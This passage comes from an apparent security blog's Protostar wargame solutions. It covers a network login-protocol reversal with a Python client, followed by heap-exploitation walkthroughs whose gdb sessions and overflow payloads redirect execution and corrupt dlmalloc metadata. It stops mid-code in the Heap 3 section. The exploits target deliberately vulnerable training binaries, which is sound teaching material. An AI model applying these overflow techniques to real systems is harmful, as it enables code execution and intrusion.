</span><span class='line'>Read digit 1572177737
</span><span class='line'>you added them correctly
</span></code></pre></td></tr></table></div></figure>


<h2>Network 03</h2>

<p>The most enjoyable of the four levels, this stage requires us to reverse a dead simple login routine and perform the login.  We&rsquo;ll start by checking out the code and figuring out what it&rsquo;s doing:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>while(1) {
</span><span class='line'>
</span><span class='line'>      // from the connection, read in the total length of the packet, then
</span><span class='line'>      // parse with ntohs and allocate the buffer with malloc
</span><span class='line'>      nread(fd, &len, sizeof(len));
</span><span class='line'>      len = ntohs(len);
</span><span class='line'>      buffer = malloc(len);
</span><span class='line'>
</span><span class='line'>      if(! buffer) errx(1, "malloc failure for %d bytes", len);
</span><span class='line'>
</span><span class='line'>      // read in LEN bytes into BUFFER
</span><span class='line'>      nread(fd, buffer, len);</span></code></pre></td></tr></table></div></figure>


<p>I&rsquo;ve commented the code inline to ease understanding.  Essentially, the first byte of our packet must be the total length of the packet.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>  // switch on the first byte of the buffer
</span><span class='line'>  switch(buffer[0]) {
</span><span class='line'>          // if the first byte is \x17, initiate login routine
</span><span class='line'>          case 23:
</span><span class='line'>              // invoke login() with buffer + 1 (skip length byte) and total len - 1 of the packet
</span><span class='line'>              loggedin = login(buffer + 1, len - 1);
</span><span class='line'>              send_string(fd, 33, loggedin ? "successful" : "failed");
</span><span class='line'>              break;
</span><span class='line'>          
</span><span class='line'>          default:
</span><span class='line'>              send_string(fd, 58, "what you talkin about willis?");
</span><span class='line'>              break;
</span><span class='line'>      }</span></code></pre></td></tr></table></div></figure>


<p>If the first byte of the buffer (second in the packet) is \x17, it initiates login.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>  deduct = get_string(&resource, buffer, len);
</span><span class='line'>  deduct += get_string(&username, buffer+deduct, len-deduct);
</span><span class='line'>  deduct += get_string(&password, buffer+deduct, len-deduct);
</span><span class='line'>
</span><span class='line'>  success = 0;
</span><span class='line'>  success |= strcmp(resource, "net3");
</span><span class='line'>  success |= strcmp(username, "awesomesauce");
</span><span class='line'>  success |= strcmp(password, "password");</span></code></pre></td></tr></table></div></figure>


<p>Here&rsquo;s the real meat of the login routine; we need three, null-terminated strings that match &ldquo;net3&rdquo;, &ldquo;awesomesauce&rdquo;, and &ldquo;password&rdquo;, respectively, to successfully authenticate to the application.  The <code>get_string</code> fuction pulls these strings out one by one:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>  unsigned char byte;
</span><span class='line'>
</span><span class='line'>  byte = *buffer;
</span><span class='line'>
</span><span class='line'>  // if it's malformed, i.e. not null term'd
</span><span class='line'>  if(byte &gt; len) errx(1, "badly formed packet");
</span><span class='line'>
</span><span class='line'>  // malloc size of byte, which is the first byte at the start of the buffer
</span><span class='line'>  *result = malloc(byte);
</span><span class='line'>
</span><span class='line'>  // strcpy buffer + 1 into the result pointer location
</span><span class='line'>  strcpy(*result, buffer + 1);
</span><span class='line'>
</span><span class='line'>  // return number of bytes read
</span><span class='line'>  return byte + 1;</span></code></pre></td></tr></table></div></figure>


<p>The caveat here is that we need to prepend the string length to each entry, then null terminate it.  This was quite simple to hack up, once it&rsquo;d been reversed:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>import struct
</span><span class='line'>import socket
</span><span class='line'>
</span><span class='line'>IP = '192.168.1.106'
</span><span class='line'>PORT = 2996
</span><span class='line'>
</span><span class='line'>try:
</span><span class='line'>    sock = socket.socket()
</span><span class='line'>    sock.connect((IP, PORT))
</span><span class='line'>
</span><span class='line'>    resource = "net3\x00"
</span><span class='line'>    username = "awesomesauce\x00"
</span><span class='line'>    password = "password\x00"
</span><span class='line'>
</span><span class='line'>    # build login packet 
</span><span class='line'>    packet = struct.pack('B', 23)
</span><span class='line'>    packet += struct.pack('B', len(resource)) + resource
</span><span class='line'>    packet += struct.pack('B', len(username)) + username
</span><span class='line'>    packet += struct.pack('B', len(password)) + password
</span><span class='line'>    packet_len = struct.pack('&gt;H', len(packet))
</span><span class='line'>
</span><span class='line'>    print '[!] Sending packet (%d)' % (len(packet) + len(packet_len))
</span><span class='line'>
</span><span class='line'>    sock.sendall(packet_len + packet)
</span><span class='line'>
</span><span class='line'>    print sock.recv(128)
</span><span class='line'>
</span><span class='line'>except Exception, e:
</span><span class='line'>    print e
</span><span class='line'>finally:
</span><span class='line'>    sock.close()</span></code></pre></td></tr></table></div></figure>


<p>Note that we&rsquo;re sending the packet length big endian due to the <code>ntohs</code> call returning a little endian value.  And once run:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># python protostar_net3.py 
</span><span class='line'>[!] Sending packet (33)
</span><span class='line'>
</span><span class='line'>!successful</span></code></pre></td></tr></table></div></figure>


<h2>Network 04</h2>

<p>Although net04 is not listed anywhere on the site, I noticed that it was both running and available in the <code>/opt/protostar/bin</code> directory.  Disassembling it reveals the answer:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> 80497a8:   e8 ff f3 ff ff          call   8048bac &lt;srandom@plt&gt;
</span><span class='line'> 80497ad:   8b 44 24 18             mov    eax,DWORD PTR [esp+0x18]
</span><span class='line'> 80497b1:   89 04 24                mov    DWORD PTR [esp],eax
</span><span class='line'> 80497b4:   e8 a1 ff ff ff          call   804975a &lt;run&gt;</span></code></pre></td></tr></table></div></figure>


<p><main> does exactly what the rest of the stages have done: backgrounding the process as the current user, serving the socket up indefinitely, changing STDIO, and invoking run().  However, stage fours run is a big nop:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>0804975a &lt;run&gt;:
</span><span class='line'> 804975a:   55                      push   ebp
</span><span class='line'> 804975b:   89 e5                   mov    ebp,esp
</span><span class='line'> 804975d:   5d                      pop    ebp
</span><span class='line'> 804975e:   c3                      ret  </span></code></pre></td></tr></table></div></figure>


<p>Not so much of a stage!  On to the final stages.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Protostar solutions - Heap Exploitation]]></title>
    <link href="http://hatRiot.github.io/blog/2014/09/21/protostar-heap-exploits/"/>
    <updated>2014-09-21T14:10:04-07:00</updated>
    <id>http://hatRiot.github.io/blog/2014/09/21/protostar-heap-exploits</id>
    <content type="html"><![CDATA[<p>And we&rsquo;re back with Protostar, this time working on the heap section.</p>

<h2>Heap Exploits 0</h2>

<p>Introductory level that demonstrates overflowing heap structures.  It&rsquo;s pretty simple:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:/opt/protostar/bin$ objdump -dt heap0 | grep winner
</span><span class='line'>08048464 g     F .text  00000014              winner
</span><span class='line'>08048478 g     F .text  00000014              nowinner
</span><span class='line'>08048464 &lt;winner&gt;:
</span><span class='line'>08048478 &lt;nowinner&gt;:</span></code></pre></td></tr></table></div></figure>


<p>And then we find our EIP offset:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) r $(python -c 'print "A"*72 + "B"*4')
</span><span class='line'>Starting program: /opt/protostar/bin/heap0 $(python -c 'print "A"*72 + "B"*4')
</span><span class='line'>data is at 0x804a008, fp is at 0x804a050
</span><span class='line'>
</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
</span><span class='line'>0x42424242 in ?? ()</span></code></pre></td></tr></table></div></figure>


<p>Using our mad exploit skills:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ ./heap0 $(python -c 'print "A"*72 + "\x64\x84\x04\x08"')
</span><span class='line'>data is at 0x804a008, fp is at 0x804a050
</span><span class='line'>level passed</span></code></pre></td></tr></table></div></figure>


<h2>Heap Exploits 1</h2>

<p>This challenge dives a bit more into heap exploitation with a nice write-what-where, and the goal is to redirect execution flow to the function <code>winner</code>.  Let&rsquo;s find that first:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ objdump -dt heap1 | grep winner
</span><span class='line'>08048494 g     F .text  00000025              winner</span></code></pre></td></tr></table></div></figure>


<p>Now let&rsquo;s check out the actual bug:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) r $(python -c 'print "A"*20 + "B"*4') xx
</span><span class='line'>The program being debugged has been started already.
</span><span class='line'>Start it from the beginning? (y or n) y
</span><span class='line'>Starting program: /opt/protostar/bin/heap1 $(python -c 'print "A"*20 + "B"*4') xx
</span><span class='line'>
</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
</span><span class='line'>*__GI_strcpy (dest=0x42424242 &lt;Address 0x42424242 out of bounds&gt;, src=0xbffff9a3 "xx") at strcpy.c:40
</span><span class='line'>40  strcpy.c: No such file or directory.
</span><span class='line'>    in strcpy.c</span></code></pre></td></tr></table></div></figure>


<p>As we can see, we control the source (argument two) and the destination, address one, which is the result of a pointer overflow in the following code:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>strcpy(i1-&gt;name, argv[1]);
</span><span class='line'>strcpy(i2-&gt;name, argv[2]);</span></code></pre></td></tr></table></div></figure>


<p>We have a couple of options for exploitation, but I chose to simply overwrite ebp+4 to take control over the return address.  Let&rsquo;s find that first:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) b *0x08048566
</span><span class='line'>Breakpoint 1 at 0x8048566: file heap1/heap1.c, line 35.
</span><span class='line'>(gdb) r xx yy
</span><span class='line'>Starting program: /opt/protostar/bin/heap1 xx yy
</span><span class='line'>and that's a wrap folks!
</span><span class='line'>
</span><span class='line'>Breakpoint 1, main (argc=3, argv=0xbffff864) at heap1/heap1.c:35
</span><span class='line'>35  heap1/heap1.c: No such file or directory.
</span><span class='line'>    in heap1/heap1.c
</span><span class='line'>(gdb) x/wx $ebp
</span><span class='line'>0xbffff7b8: 0xbffff838</span></code></pre></td></tr></table></div></figure>


<p>This shows ebp is located at 0xbffff7b8, so let&rsquo;s overwrite that:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) r $(python -c 'print "A"*20 + "\x98\xf7\xff\xbf"') $(python -c 'print "A"*4 + "B"*4')
</span><span class='line'>The program being debugged has been started already.
</span><span class='line'>Start it from the beginning? (y or n) y
</span><span class='line'>Starting program: /opt/protostar/bin/heap1 $(python -c 'print "A"*20 + "\x98\xf7\xff\xbf"') $(python -c 'print "A"*4 + "B"*4')
</span><span class='line'>and that's a wrap folks!
</span><span class='line'>
</span><span class='line'>Breakpoint 1, main (argc=0, argv=0xbffff844) at heap1/heap1.c:35
</span><span class='line'>35  in heap1/heap1.c
</span><span class='line'>(gdb) x/wx $ebp
</span><span class='line'>0xbffff798: 0x41414141
</span><span class='line'>(gdb) x/wx $ebp+4
</span><span class='line'>0xbffff79c: 0x42424242
</span><span class='line'>(gdb) </span></code></pre></td></tr></table></div></figure>


<p>Note that ebp&rsquo;s address changed; this is a stupid method and is susceptible to stack shifting, so we need to ensure we accomodate for that.  Anyway, now we can control where we return to, so let&rsquo;s pop in our winning address:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) r $(python -c 'print "A"*20 + "\x98\xf7\xff\xbf"') $(python -c 'print "A"*4 + "\x94\x84\x04\x08"')
</span><span class='line'>
</span><span class='line'>Breakpoint 1, main (argc=0, argv=0xbffff844) at heap1/heap1.c:35
</span><span class='line'>35  in heap1/heap1.c
</span><span class='line'>(gdb) x/wx $ebp
</span><span class='line'>0xbffff798: 0x41414141
</span><span class='line'>(gdb) x/wx $ebp+4
</span><span class='line'>0xbffff79c: 0x08048494
</span><span class='line'>(gdb) c
</span><span class='line'>Continuing.
</span><span class='line'>and we have a winner @ 1410933753
</span><span class='line'>
</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
</span><span class='line'>0x00000000 in ?? ()
</span><span class='line'>(gdb) </span></code></pre></td></tr></table></div></figure>


<p>And that&rsquo;s all!  Notice we still segfault, this is because we&rsquo;ve totally screwed up the stack, and it&rsquo;s trying to pop another value off the stack and return there.  We can trivally fix that by appending the address for exit:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) r $(python -c 'print "A"*20 + "\x98\xf7\xff\xbf"') $(python -c 'print "A"*4 + "\x94\x84\x04\x08" + "\xc0\x60\xec\xb7"')
</span><span class='line'>Starting program: /opt/protostar/bin/heap1 $(python -c 'print "A"*20 + "\x98\xf7\xff\xbf"') $(python -c 'print "A"*4 + "\x94\x84\x04\x08" + "\xc0\x60\xec\xb7"')
</span><span class='line'>and that's a wrap folks!
</span><span class='line'>and we have a winner @ 1410933890
</span><span class='line'>
</span><span class='line'>Program exited with code 0124.
</span><span class='line'>(gdb) </span></code></pre></td></tr></table></div></figure>


<h2>Heap Exploits 2</h2>

<p>This one is pretty simple, and doesn&rsquo;t require us to really exploit much.  What we have is basically a contrived authentication service that&rsquo;s got four commands: auth, reset, service, and login.  The goal is to trigger the &ldquo;you have logged in already!&rdquo; message.  Here&rsquo;s the solution:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:/opt/protostar/bin$ ./heap2
</span><span class='line'>[ auth = (nil), service = (nil) ]
</span><span class='line'>auth xx
</span><span class='line'>[ auth = 0x804c008, service = (nil) ]
</span><span class='line'>service xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
</span><span class='line'>[ auth = 0x804c008, service = 0x804c018 ]
</span><span class='line'>login
</span><span class='line'>you have logged in already!
</span><span class='line'>[ auth = 0x804c008, service = 0x804c018 ]</span></code></pre></td></tr></table></div></figure>


<p>First we auth, which allocates the auth structure:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>if(strncmp(line, "auth ", 5) == 0) {
</span><span class='line'>  auth = malloc(sizeof(auth));
</span><span class='line'>  memset(auth, 0, sizeof(auth));
</span><span class='line'>  if(strlen(line + 5) &lt; 31) {
</span><span class='line'>    strcpy(auth-&gt;name, line + 5);
</span><span class='line'>  }
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>Then we execute service with a long string:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>if(strncmp(line, "service", 6) == 0) {
</span><span class='line'>      service = strdup(line + 7);
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>strdup duplicates a string, allocated via malloc.  Note in the auth struct allocation that it&rsquo;s only allocating <code>sizeof(auth)</code>.  This is an incorrect allocation, as it&rsquo;s really just allocating memory for a struct <em>pointer</em>, and not the 30 odd bytes for the structure.  We can easily demonstrate this with multiple auth struct allocations:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ ./heap2
</span><span class='line'>[ auth = (nil), service = (nil) ]
</span><span class='line'>auth 1 
</span><span class='line'>[ auth = 0x804c008, service = (nil) ]
</span><span class='line'>auth 2
</span><span class='line'>[ auth = 0x804c018, service = (nil) ]</span></code></pre></td></tr></table></div></figure>


<p>This 16 byte difference is comprised solely of chunk headers.  All we need to do is set the auth flag in the struct to some non-zero value, which can be done with the service command and our arbitrarily long string allocation.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>if(strncmp(line, "login", 5) == 0) {
</span><span class='line'>    if(auth-&gt;auth) {
</span><span class='line'>      printf("you have logged in already!\n");
</span><span class='line'>    } else {
</span><span class='line'>      printf("please enter your password\n");
</span><span class='line'>    }
</span><span class='line'>  }</span></code></pre></td></tr></table></div></figure>


<h2>Heap Exploits 3</h2>

<p>This is the level that I thought more of these would be; this level requires us to manipulate heap metadata in order to obtain code execution.  Whilst this method is terribly outdated and not applicable at all to modern heaps, it&rsquo;s still a blast, and many of the high level methods still apply.</p>

<p>I highly, highly recommend reading the essential <a href="http://phrack.org/issues/57/9.html"><em>Once Upon A Free()</em></a> if you&rsquo;re unfamiliar with old school, dlmalloc heap exploitation, as there is quite a bit of prerequisite knowledge necessary to complete this stage.  I&rsquo;ll assume the reader has a cursory understanding of how this process will go down.</p>

<p>Much like the previous stages, we need to redirect the program to another function, <code>winner</code>.  Stage 3 executes three separate, 32 byte malloc&rsquo;s, strcpy&rsquo;s our input into each chunk, then free&rsquo;s them in <a href="http://webcache.googleusercontent.com/search?q=cache:TddtBQ76DO4J:exploit-exercises.com/protostar/heap3+&amp;cd=11&amp;hl=en&amp;ct=clnk&amp;gl=us">reverse</a>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>a = malloc(32);
</span><span class='line'>b = malloc(32);
</span><span class='line'>c = malloc(32);
</span><span class='line'>
</span><span class='line'>strcpy(a, argv[1]);
</span><span class='line'>strcpy(b, argv[2]);
</span><span class='line'>strcpy(c, argv[3]);
</span><span class='line'>
</span><span class='line'>free(c);
</span><span class='line'>free(b);
</span><span class='line'>free(a);</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s first check out the memory layout.  After all three allocations and strcpy&rsquo;s, but before any free&rsquo;s:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) x/10wx 0x804c008-8
</span><span class='line'>0x804c000:  0x00000000  0x00000029  0x41414141  0x00000000
</span><span class='line'>0x804c010:  0x00000000  0x00000000  0x00000000  0x00000000
</span><span class='line'>0x804c020:  0x00000000  0x00000000
</span><span class='line'>(gdb) x/10wx 0x804c030-8
</span><span class='line'>0x804c028:  0x00000000  0x00000029  0x42424242  0x00000000
</span><span class='line'>0x804c038:  0x00000000  0x00000000  0x00000000  0x00000000
</span><span class='line'>0x804c048:  0x00000000  0x00000000
</span><span class='line'>(gdb) x/10wx 0x804c058-8
</span><span class='line'>0x804c050:  0x00000000  0x00000029  0x43434343  0x00000000
</span><span class='line'>0x804c060:  0x00000000  0x00000000  0x00000000  0x00000000
</span><span class='line'>0x804c070:  0x00000000  0x00000000
</span><span class='line'>(gdb)</span></code></pre></td></tr></table></div></figure>


<p>Recall that each chunk has metadata in-channel that allows dlmalloc to traverse, coalesce, and fetch chunks on the heap.  In the above case, three allocated chunks have two requisite fields: <code>prev_size</code> and <code>size</code>.  As none of the previous chunks in the heap have been free&rsquo;d, the<code>prev_size</code> field is 0x0.  The size field is 0x29, or 41.  The lower three bits are reserved in this field, so accounting for that:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) p/d 0x29 & ~3
</span><span class='line'>$1 = 40
</span><span class='line'>(gdb)      </span></code></pre></td></tr></table></div></figure>


<p>These three chunks are then free&rsquo;d in reverse order, starting from chunk c.  Exploitation for this rather straight forward, we just need to overflow adjacent metadata headers to craft an illicit chunk.  Once free enters its unlink macro, we obtain execution flow control.</p>

<p>We need to start by setting the <code>prev_size</code> and <code>size</code> fields to values that allow us to control forward and backward chunk pointers.  We begin by setting both fields to 0xffffffc, or -4.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) r $(python -c 'print "A"*32 + "\xfc\xff\xff\xff"*2') BBBB CCCC
</span><span class='line'>Starting program: /opt/protostar/bin/heap3 $(python -c 'print "A"*32 + "\xfc\xff\xff\xff"*2') BBBB CCCC
</span><span class='line'>
</span><span class='line'>Breakpoint 1, 0x08048911 in main (argc=4, argv=0xbffff824) at heap3/heap3.c:24
</span><span class='line'>24  in heap3/heap3.c
</span><span class='line'>(gdb) x/10wx 0x804c030-8
</span><span class='line'>0x804c028:  0xfffffffc  0xfffffffc  0x42424242  0x00000000
</span><span class='line'>0x804c038:  0x00000000  0x00000000  0x00000000  0x00000000
</span><span class='line'>0x804c048:  0x00000000  0x00000000</span></code></pre></td></tr></table></div></figure>


<p>We now shift to setting the flink and blink values, which are set once a chunk is freed.  Let&rsquo;s inspect these chunks after all three have been freed:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) x/10wx 0x804c008-8
</span><span class='line'>0x804c000:  0x00000000  0x00000029  0x0804c028  0x00000000
</span><span class='line'>0x804c010:  0x00000000  0x00000000  0x00000000  0x00000000
</span><span class='line'>0x804c020:  0x00000000  0x00000000
</span><span class='line'>(gdb) x/10wx 0x804c030-8
</span><span class='line'>0x804c028:  0x00000000  0x00000029  0x0804c050  0x00000000
</span><span class='line'>0x804c038:  0x00000000  0x00000000  0x00000000  0x00000000
</span><span class='line'>0x804c048:  0x00000000  0x00000000
</span><span class='line'>(gdb) x/10wx 0x804c058-8
</span><span class='line'>0x804c050:  0x00000000  0x00000029  0x00000000  0x00000000
</span><span class='line'>0x804c060:  0x00000000  0x00000000  0x00000000  0x00000000
</span><span class='line'>0x804c070:  0x00000000  0x00000000</span></code></pre></td></tr></table></div></figure>


<p>The value after the <code>size</code> field is a forward pointer to the next free chunk.  There would typically be another pointer in the next field, a backwards link, however, dlmalloc employs what&rsquo;s known as fastbins.  This is a singly-linked list holding recently freed small chunks ( &lt; 64 bytes).  More on this can be found <a href="ftp://g.oswego.edu/pub/misc/malloc-2.7.0.c">here</a>.</p>

<p>Taking a quick peek at the exploitable unlink macro:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
